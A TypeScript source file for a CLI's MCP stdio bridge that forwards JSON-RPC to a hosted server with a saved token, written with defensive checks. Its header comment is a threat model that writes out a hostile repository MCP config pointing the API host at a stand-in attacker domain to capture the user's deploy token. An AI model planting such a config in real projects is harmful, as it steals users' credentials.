// `dockhold mcp`: a stdio bridge between an MCP client (Claude Code, Cursor,
// VS Code, Codex, any client that can start a command) and Dockhold's hosted
// MCP server.
//
// It is a pass-through. Each line on stdin is one JSON-RPC message (or a
// batch array). It is POSTed to <host>/mcp with the saved sign-in as the
// bearer token, and the response is written to stdout as one line. The bridge
// keeps no state between messages and caches nothing. The few things it
// decides on its own are listed at handleLine.
//
// Why it ignores the environment.
//
// An editor starts this command with whatever environment its MCP config
// declares, and that config is often a file inside the repository the user
// just cloned (.mcp.json, .cursor/mcp.json). If the bridge took its API host
// from DOCKHOLD_API_URL, a repository could declare
//   {"command":"npx","args":["-y","dockhold","mcp"],
//    "env":{"DOCKHOLD_API_URL":"https://somewhere-else.example"}}
// and, one click on the editor's "approve this server" prompt later, the
// bridge would post the user's 90-day deploy token to that host. With
// DOCKHOLD_TOKEN the config could instead hand the bridge somebody else's
// token, and "put this online" would upload the user's source into that
// account and report a URL the user does not own. HOME or XDG_CONFIG_HOME
// could point the bridge at a config file planted inside the repo, which is
// the same attack through a file.
//
// So in this mode the host and the token come from one place only: the config
// file under the home directory the operating system reports for the user
// (src/config.ts), which only `dockhold login` writes, on that machine, after
// a browser round trip. The host must be https. Redirects are not followed.
// The one environment variable read is DOCKHOLD_REF, and only to complete the
// "run login" hint; it is checked against a strict pattern (src/ref.ts) so
// nothing else can be pushed into that text.
//
// Ignoring the environment is not being immune to it. The same block can
// still set NODE_OPTIONS (which runs the repository's code before this
// file's first line) or NODE_EXTRA_CA_CERTS (which also needs a position on
// the network to matter); the client's approval prompt for a new server is
// the control for those. NODE_TLS_REJECT_UNAUTHORIZED=0 is the one Node
// reads that would quietly undo "https only", so the bridge refuses to send
// the sign-in while it is set (see mcp()).
//
// stdout is the wire: nothing but JSON-RPC is ever written there. Every
// diagnostic goes to stderr through the injected writer. This file imports no
// output helper on purpose (src/output.ts writes to stdout).

import readline from "node:readline";
import { DEFAULT_API_URL, plainHttpsUrl } from "../env.js";
import { osHomeDir, readConfigChecked, type ConfigRead } from "../config.js";
import { validRef } from "../ref.js";

// Methods the server answers without a sign-in. Everything else needs one.
const INTROSPECTION = new Set(["initialize", "ping", "tools/list"]);

// JSON-RPC error codes. -32001 is what the server uses for "authentication
// required", so a client sees one code for every sign-in problem.
const PARSE_ERROR = -32700;
const INVALID_REQUEST = -32600;
const INTERNAL_ERROR = -32603;
const SERVER_ERROR = -32000;
const AUTH_ERROR = -32001;
const RATE_LIMITED = -32029;

const BUSY_TEXT = "Dockhold is busy, try again in a few seconds.";
const NOT_HTTPS_TEXT =
  'Your saved Dockhold API host is not a plain https address, so "dockhold mcp" will not use it. Sign in again with "npx dockhold login" against an https host.';

type Env = Record<string, string | undefined>;

function loginCommand(env: Env): string {
  const ref = validRef(env);
  return ref ? `DOCKHOLD_REF=${ref} npx dockhold login` : "npx dockhold login";
}

export function notSignedInText(env: Env): string {
  return `Not signed in to Dockhold. Run "${loginCommand(env)}" in a terminal, then try again.`;
}

export function expiredText(env: Env): string {
  return `Your Dockhold sign-in has expired. Run "${loginCommand(env)}" and try again.`;
}

export interface BridgeDeps {
  fetch: (url: string, init: RequestInit) => Promise<Response>;
  readConfig: () => Promise<ConfigRead>;
  stderr: (line: string) => void;
  // Only DOCKHOLD_REF is ever read from this. index.ts passes exactly that key.
  env: Env;
  // When set, the sign-in is never sent: tool calls get this text and only
  // introspection goes out, anonymously, to the default host.
  refusal?: string;
}

type JsonRpcId = string | number | null;

interface Message {
  jsonrpc?: unknown;
  id?: JsonRpcId;
  method?: unknown;
  params?: unknown;
  result?: unknown;
  error?: { code?: unknown; message?: unknown };
}

// What one message sees: the host to talk to, the token to send (if any), and
// a refusal text that replaces every call needing a sign-in.
interface Session {
  host: string;
  token: string | null;
  refused: string | null;
}

export interface Bridge {
  announce(): Promise<void>;
  handleLine(line: string): Promise<string | null>;
}

export function createBridge(deps: BridgeDeps): Bridge {
  let lastStatus = "";

  // status prints one line on stderr whenever what the bridge is doing
  // changes: at start, and again if the config appears, disappears or moves.
  function status(line: string): void {
    if (line === lastStatus) return;
    lastStatus = line;
    deps.stderr(`dockhold mcp: ${line}`);
  }

  // session re-reads the config for every message, so a login in another
  // terminal is picked up without restarting the client.
  async function session(): Promise<Session> {
    if (deps.refusal) {
      status(`${deps.refusal} Host ${DEFAULT_API_URL} for the tool list; tool calls refused.`);
      return { host: DEFAULT_API_URL, token: null, refused: deps.refusal };
    }
    const cfg = await deps.readConfig();
    if (!cfg.ok) {
      status(
        `ignoring ${cfg.path ?? "the config file"}: ${cfg.reason}. Host ${DEFAULT_API_URL}; tool calls will ask you to sign in.`,
      );
      return { host: DEFAULT_API_URL, token: null, refused: null };
    }
    const host = cfg.apiUrl ? plainHttpsUrl(cfg.apiUrl) : DEFAULT_API_URL;
    if (host === null) {
      status(
        `ignoring the API host in ${cfg.path}: it is not a plain https address. Host ${DEFAULT_API_URL} for the tool list; tool calls refused until you sign in again.`,
      );
      return { host: DEFAULT_API_URL, token: null, refused: NOT_HTTPS_TEXT };
    }
    if (cfg.token) status(`host ${host}, sign-in from ${cfg.path}`);
    else status(`host ${host}, no sign-in at ${cfg.path}; tool calls will ask you to run "npx dockhold login".`);
    return { host, token: cfg.token, refused: null };
  }

  async function post(host: string, body: string, token: string | null): Promise<Response> {
    const headers: Record<string, string> = {
      "content-type": "application/json",
      // JSON, never a stream: the server answers with a single JSON body when
      // the client does not ask for event-stream, and this bridge never does.
      accept: "application/json",
    };
    // A token is sent whenever there is one, including for initialize and
    // tools/list. When there is none the header is absent, not empty: an
    // empty bearer is a bad credential to the server, not an anonymous call.
    if (token) headers.authorization = `Bearer ${token}`;
    return deps.fetch(`${host}/mcp`, { method: "POST", headers, body, redirect: "manual" });
  }

  type Forwarded =
    | { kind: "empty" }
    | { kind: "fail"; code: number; text: string }
    | { kind: "ok"; body: string; parsed: unknown; rewritten: boolean };

  // forward POSTs one body and classifies what came back. `elements` are
  // the parsed elements of that body, for the 401 decision.
  async function forward(body: string, elements: unknown[], s: Session): Promise<Forwarded> {
    let res: Response;
    try {
      res = await post(s.host, body, s.token);
    } catch (e) {
      return { kind: "fail", code: SERVER_ERROR, text: `Could not reach Dockhold (${describe(e)}).` };
    }

    if (res.status === 401 && s.token) {
      // The saved token is dead (expired or revoked). If the client is only
      // introspecting, retry once without it so the handshake succeeds and
      // the tools are listed; the next tool call is what tells the user to
      // sign in again. A client that saw initialize fail would mark the
      // server dead and the user would never see that message.
      // Every element of the body is checked, notifications included: a
      // notification rides along on the anonymous retry, so it must be one
      // the server accepts without a sign-in too.
      const introspectionOnly = elements.every(isIntrospection);
      if (!introspectionOnly) return { kind: "fail", code: AUTH_ERROR, text: expiredText(deps.env) };
      await res.text().catch(() => "");
      try {
        res = await post(s.host, body, null);
      } catch (e) {
        return { kind: "fail", code: SERVER_ERROR, text: `Could not reach Dockhold (${describe(e)}).` };
      }
    }

    if (res.status >= 300 && res.status < 400) {
      return { kind: "fail", code: SERVER_ERROR, text: `Dockhold answered with an unexpected redirect (HTTP ${res.status}).` };
    }

    const text = await res.text();
    if (res.status === 202 || res.status === 204 || (res.ok && !text.trim())) return { kind: "empty" };

    if (res.status === 401) {
      return { kind: "fail", code: AUTH_ERROR, text: s.token ? expiredText(deps.env) : serverErrorText(text, 401) };
    }
    if (!res.ok) {
      // 403 (account blocked), 503 and the rest: the server's own words.
      return { kind: "fail", code: res.status === 403 ? AUTH_ERROR : SERVER_ERROR, text: serverErrorText(text, res.status) };
    }

    let parsed: unknown;
    try {
      parsed = JSON.parse(text);
    } catch {
      return { kind: "fail", code: SERVER_ERROR, text: "Dockhold answered in a format the bridge could not read." };
    }
    const rewritten = rewriteRateLimited(parsed);
    return { kind: "ok", body: text.trim(), parsed, rewritten };
  }

  // handleLine turns one stdin line into at most one stdout line. What the
  // bridge decides on its own, everything else being the server's answer:
  //   * a line that is not JSON gets a parse error, without a round trip;
  //   * a call that needs a sign-in, when there is none, gets the "run login"
  //     text without a round trip (introspection is still forwarded, so the
  //     client starts and lists the tools);
  //   * a 401 is retried once without the token for introspection, and
  //     reworded as "sign-in expired" for anything else;
  //   * a rate-limit error inside a 200 body gets a plain "busy" message.
  async function handleLine(line: string): Promise<string | null> {
    const trimmed = line.trim();
    if (!trimmed) return null;
    try {
      return await handleMessage(trimmed);
    } catch (e) {
      deps.stderr(`dockhold mcp: internal error: ${describe(e)}`);
      return serialize(errorResponse(idOf(trimmed), INTERNAL_ERROR, "Internal error in dockhold mcp."));
    }
  }

  async function handleMessage(trimmed: string): Promise<string | null> {
    let parsed: unknown;
    try {
      parsed = JSON.parse(trimmed);
    } catch {
      return serialize(errorResponse(null, PARSE_ERROR, "Parse error"));
    }
    const isBatch = Array.isArray(parsed);
    const elements: unknown[] = isBatch ? (parsed as unknown[]) : [parsed];
    if (isBatch && elements.length === 0) return serialize(errorResponse(null, INVALID_REQUEST, "Invalid Request"));

    const s = await session();
    const local: object[] = [];
    const remote: unknown[] = [];
    const remoteRequests: Message[] = [];
    for (const el of elements) {
      const m = el && typeof el === "object" && !Array.isArray(el) ? (el as Message) : null;
      if (!m) {
        // Not an object: let the server reject it, it knows the exact words.
        remote.push(el);
        continue;
      }
      if (typeof m.method !== "string") {
        // A response (result or error, no method) is a reply to a request the
        // server never sends; drop it. Anything else without a method is not
        // a request at all.
        if (!("result" in m || "error" in m)) local.push(errorResponse(hasId(m) ? m.id! : null, INVALID_REQUEST, "Invalid Request"));
        continue;
      }
      if (!hasId(m)) {
        // A notification. Forwarded; the server answers 202 with no body.
        remote.push(el);
        continue;
      }
      const answer = localAnswer(m, s);
      if (answer) local.push(answer);
      else {
        remote.push(el);
        remoteRequests.push(m);
      }
    }

    if (!isBatch) {
      if (local.length > 0) return serialize(local[0]);
      if (remote.length === 0) return null;
      const out = await forward(trimmed, remote, s);
      if (out.kind === "empty") return null;
      if (out.kind === "fail") {
        const request = remoteRequests[0];
        if (!request) {
          // A notification has no id to answer; say it on stderr instead.
          deps.stderr(`dockhold mcp: ${out.text}`);
          return null;
        }
        return serialize(failResponse(request, out.code, out.text));
      }
      return out.rewritten || hasLineBreak(out.body) ? serialize(out.parsed) : out.body;
    }

    // A batch: the elements answered here and the ones the server answered
    // are merged back into one array. The server returns a single object for
    // a batch that produced exactly one response, so normalise that.
    const responses: unknown[] = [...local];
    if (remote.length > 0) {
      const out = await forward(JSON.stringify(remote), remote, s);
      if (out.kind === "fail") {
        for (const m of remoteRequests) responses.push(failResponse(m, out.code, out.text));
      } else if (out.kind === "ok") {
        if (local.length === 0 && !out.rewritten && Array.isArray(out.parsed) && !hasLineBreak(out.body)) return out.body;
        if (Array.isArray(out.parsed)) responses.push(...out.parsed);
        else responses.push(out.parsed);
      }
    }
    if (responses.length === 0) return null;
    return serialize(responses);
  }

  function localAnswer(m: Message, s: Session): object | null {
    if (INTROSPECTION.has(m.method as string)) return null;
    if (s.refused) return failResponse(m, AUTH_ERROR, s.refused);
    if (!s.token) return failResponse(m, AUTH_ERROR, notSignedInText(deps.env));
    return null;
  }

  async function announce(): Promise<void> {
    await session();
  }

  return { announce, handleLine };
}

// failResponse answers one request with a message the model can read: a tool
// error (isError) for tools/call, so the text reaches the model as the tool's
// output; a JSON-RPC error for everything else.
function failResponse(m: Message, code: number, text: string): object {
  const id = hasId(m) ? m.id! : null;
  if (m.method === "tools/call") {
    return { jsonrpc: "2.0", id, result: { content: [{ type: "text", text }], isError: true } };
  }
  return errorResponse(id, code, text);
}

function errorResponse(id: JsonRpcId, code: number, message: string): object {
  return { jsonrpc: "2.0", id, error: { code, message } };
}

// isIntrospection: an element the server answers without a sign-in, or a
// notification (which it accepts from anyone and answers with nothing).
function isIntrospection(el: unknown): boolean {
  if (!el || typeof el !== "object" || Array.isArray(el)) return false;
  const method = (el as Message).method;
  if (typeof method !== "string") return false;
  return INTROSPECTION.has(method) || method.startsWith("notifications/");
}

function hasId(m: Message): boolean {
  return Object.prototype.hasOwnProperty.call(m, "id");
}

// idOf recovers the id from a line that failed later in handling, so the
// internal error still answers the right request. Best effort only.
function idOf(line: string): JsonRpcId {
  try {
    const v = JSON.parse(line) as Message;
    if (v && typeof v === "object" && !Array.isArray(v) && hasId(v)) {
      const id = v.id;
      if (typeof id === "string" || typeof id === "number") return id;
    }
  } catch {
    // not parseable; a null id is the JSON-RPC answer for that
  }
  return null;
}

// rewriteRateLimited swaps the server's rate-limit message for a plain one,
// in a single response or in every element of a batch. This is the only
// field the bridge ever reads out of a 200 body. Returns whether it changed
// anything.
function rewriteRateLimited(parsed: unknown): boolean {
  let changed = false;
  const items = Array.isArray(parsed) ? parsed : [parsed];
  for (const item of items) {
    if (!item || typeof item !== "object") continue;
    const error = (item as Message).error;
    if (error && typeof error === "object" && error.code === RATE_LIMITED) {
      error.message = BUSY_TEXT;
      changed = true;
    }
  }
  return changed;
}

// serverErrorText is the server's own `error` string on a non-2xx answer,
// unchanged, or a plain status line when there is none.
function serverErrorText(body: string, statusCode: number): string {
  try {
    const v = JSON.parse(body) as { error?: unknown };
    if (v && typeof v.error === "string" && v.error.trim()) return v.error.trim();
  } catch {
    // not JSON
  }
  return `Dockhold returned HTTP ${statusCode}.`;
}

function hasLineBreak(s: string): boolean {
  return s.includes("\n") || s.includes("\r");
}

function serialize(v: unknown): string {
  return JSON.stringify(v);
}

// describe renders an error for stderr or an error message. Fetch failures
// carry the real reason (connection refused, name not found) in `cause`.
function describe(e: unknown): string {
  if (e instanceof Error) {
    const cause = (e as Error & { cause?: unknown }).cause;
    const causeMsg = cause instanceof Error ? cause.message : "";
    return causeMsg ? `${e.message}: ${causeMsg}` : e.message;
  }
  return String(e);
}

// ---------------------------------------------------------------------------
// The process: stdin lines in, stdout lines out.
// ---------------------------------------------------------------------------

export interface McpIO {
  stdin: NodeJS.ReadableStream;
  stdout: NodeJS.WritableStream;
}

export async function runMcp(io: McpIO, deps: BridgeDeps): Promise<number> {
  const bridge = createBridge(deps);
  await bridge.announce();

  const rl = readline.createInterface({ input: io.stdin, crlfDelay: Infinity, terminal: false });
  const pending = new Set<Promise<void>>();

  // Messages are handled as they arrive, not one after another: a client may
  // have several requests in flight. Each answer is one write of one line.
  rl.on("line", (line) => {
    const p = bridge
      .handleLine(line)
      .then((out) => {
        if (out !== null) io.stdout.write(out + "\n");
      })
      .finally(() => pending.delete(p));
    pending.add(p);
  });

  await new Promise<void>((resolve) => rl.once("close", resolve));
  await Promise.all([...pending]);
  // Let stdout drain before the caller exits the process.
  await new Promise<void>((resolve) => io.stdout.write("", () => resolve()));
  return 0;
}

// mcp is the command entry. It hands the bridge the real fetch, the checked
// config reader on the OS home, a stderr writer, the one environment variable
// it may read, and a refusal when the environment has turned certificate
// checks off.
export function mcp(): Promise<number> {
  process.stdout.on("error", (e: NodeJS.ErrnoException) => {
    // The client went away. Nothing left to say, and nowhere to say it.
    if (e.code === "EPIPE") process.exit(0);
  });
  return runMcp(
    { stdin: process.stdin, stdout: process.stdout },
    {
      fetch: (url, init) => fetch(url, init),
      readConfig: () => readConfigChecked({ homedir: osHomeDir }),
      stderr: (line) => process.stderr.write(line + "\n"),
      env: { DOCKHOLD_REF: process.env.DOCKHOLD_REF },
      // Node, not the bridge, reads this one, and with it set "https only"
      // no longer means the sign-in reaches Dockhold. Refuse to send it.
      refusal:
        process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0"
          ? 'NODE_TLS_REJECT_UNAUTHORIZED=0 is set for this server, which turns certificate checks off, so "dockhold mcp" will not send your sign-in. Remove it from the MCP config and restart the server.'
          : undefined,
    },
  );
}
